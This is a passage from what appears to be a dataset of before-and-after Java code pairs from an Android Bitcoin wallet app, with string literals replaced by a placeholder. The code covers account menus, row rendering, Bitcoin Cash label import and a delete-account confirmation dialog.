      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (accountListAdapter.getFocusedAccount() != null) {
        accountListAdapter.setFocusedAccount(null);
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  accountListAdapter.setFocusedAccount(account);
  update();
}","private void updateIncludingMenus(){
  WalletAccount account=accountListAdapter.getFocusedAccount();
  boolean isBch=account.getType() == WalletAccount.Type.BCHSINGLEADDRESS || account.getType() == WalletAccount.Type.BCHBIP44;
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed() && !isBch) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)&& !isBch) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive() && !isBch) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount) && !isBch) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.getType() != WalletAccount.Type.BCHBIP44 && account.getType() != WalletAccount.Type.BCHSINGLEADDRESS && account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount && !isBch) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& AccountManager.INSTANCE.getBTCMasterSeedAccounts().size() > 1 && !isBch) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  AppCompatActivity parent=(AppCompatActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (accountListAdapter.getFocusedAccount() != null) {
        accountListAdapter.setFocusedAccount(null);
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  accountListAdapter.setFocusedAccount(account);
  update();
}"
91034,"@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
    _toaster.toast(R.string.synchronizing_please_wait,false);
    return true;
  }
  int id=menuItem.getItemId();
  if (id == R.id.miActivate) {
    activateSelected();
    return true;
  }
 else   if (id == R.id.miSetLabel) {
    setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
    return true;
  }
 else   if (id == R.id.miDeleteRecord) {
    deleteSelected();
    return true;
  }
 else   if (id == R.id.miArchive) {
    archiveSelected();
    return true;
  }
 else   if (id == R.id.miHideUnusedAccount) {
    hideSelected();
    return true;
  }
 else   if (id == R.id.miExport) {
    exportSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miIgnoreWarnings) {
    ignoreSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miSignMessage) {
    signMessage();
    return true;
  }
 else   if (id == R.id.miDetach) {
    detachFromLocalTrader();
    return true;
  }
 else   if (id == R.id.miShowOutputs) {
    showOutputs();
    return true;
  }
 else   if (id == R.id.miMakeBackup) {
    makeBackup();
    return true;
  }
 else   if (id == R.id.miSingleKeyBackupVerify) {
    verifySingleKeyBackup();
    return true;
  }
 else   if (id == R.id.miRescan) {
    rescan();
    return true;
  }
 else   if (id == R.id.miSetMail) {
    setCoinapultMail();
    return true;
  }
 else   if (id == R.id.miVerifyMail) {
    verifyCoinapultMail();
    return true;
  }
  return false;
}","@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
    _toaster.toast(R.string.synchronizing_please_wait,false);
    return true;
  }
  int id=menuItem.getItemId();
  if (id == R.id.miActivate) {
    activateSelected();
    return true;
  }
 else   if (id == R.id.miSetLabel) {
    setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
    return true;
  }
 else   if (id == R.id.miDeleteRecord) {
    deleteSelected();
    return true;
  }
 else   if (id == R.id.miArchive) {
    archiveSelected();
    return true;
  }
 else   if (id == R.id.miHideUnusedAccount) {
    hideSelected();
    return true;
  }
 else   if (id == R.id.miExport) {
    exportSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miSignMessage) {
    signMessage();
    return true;
  }
 else   if (id == R.id.miDetach) {
    detachFromLocalTrader();
    return true;
  }
 else   if (id == R.id.miShowOutputs) {
    showOutputs();
    return true;
  }
 else   if (id == R.id.miMakeBackup) {
    makeBackup();
    return true;
  }
 else   if (id == R.id.miSingleKeyBackupVerify) {
    verifySingleKeyBackup();
    return true;
  }
 else   if (id == R.id.miRescan) {
    rescan();
    return true;
  }
 else   if (id == R.id.miSetMail) {
    setCoinapultMail();
    return true;
  }
 else   if (id == R.id.miVerifyMail) {
    verifyCoinapultMail();
    return true;
  }
  return false;
}"
91035,"public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=rowView.findViewById(R.id.tvAddress);
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  TextView tvAccountType=rowView.findViewById(R.id.tvAccountType);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=rowView.findViewById(R.id.tvBalance);
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showLegacyAccountWarning=showLegacyAccountWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(showLegacyAccountWarning ? View.VISIBLE : View.GONE);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
    tvAccountType.setVisibility(View.GONE);
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
    if (walletAccount.getType() == WalletAccount.Type.BCHBIP44 || walletAccount.getType() == WalletAccount.Type.BCHSINGLEADDRESS) {
      tvAccountType.setText(Html.fromHtml(tvAccountType.getResources().getString(R.string.bitcoin_cash)));
      tvAccountType.setVisibility(View.VISIBLE);
    }
 else {
      tvAccountType.setVisibility(View.GONE);
    }
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}","public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=rowView.findViewById(R.id.tvAddress);
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  TextView tvAccountType=rowView.findViewById(R.id.tvAccountType);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=rowView.findViewById(R.id.tvBalance);
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
    tvAccountType.setVisibility(View.GONE);
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
    if (walletAccount.getType() == WalletAccount.Type.BCHBIP44 || walletAccount.getType() == WalletAccount.Type.BCHSINGLEADDRESS) {
      tvAccountType.setText(Html.fromHtml(tvAccountType.getResources().getString(R.string.bitcoin_cash)));
      tvAccountType.setVisibility(View.VISIBLE);
    }
 else {
      tvAccountType.setVisibility(View.GONE);
    }
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}"
91036,"public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}","public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=getBitcoinCashAccountId(walletAccount);
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}"
91037,"private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account instanceof ColuAccount) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    deleteDialog.setMessage(R.string.delete_account_message);
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _storage.deleteAccountMetadata(accountToDelete.getId());
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
            _storage.deleteAccountMetadata(linkedColuAccount.getId());
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
        _storage.deleteAccountMetadata(accountToDelete.getId());
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}","private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account.getType() == WalletAccount.Type.COLU) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    WalletAccount correspondingBCHAccount=_mbwManager.getWalletManager(false).getAccount(MbwManager.getBitcoinCashAccountId(account));
    if (correspondingBCHAccount != null && correspondingBCHAccount.isVisible()) {
      deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_bch_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(correspondingBCHAccount.getId())));
    }
 else {
      deleteDialog.setMessage(getString(R.string.delete_account_message));
    }
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
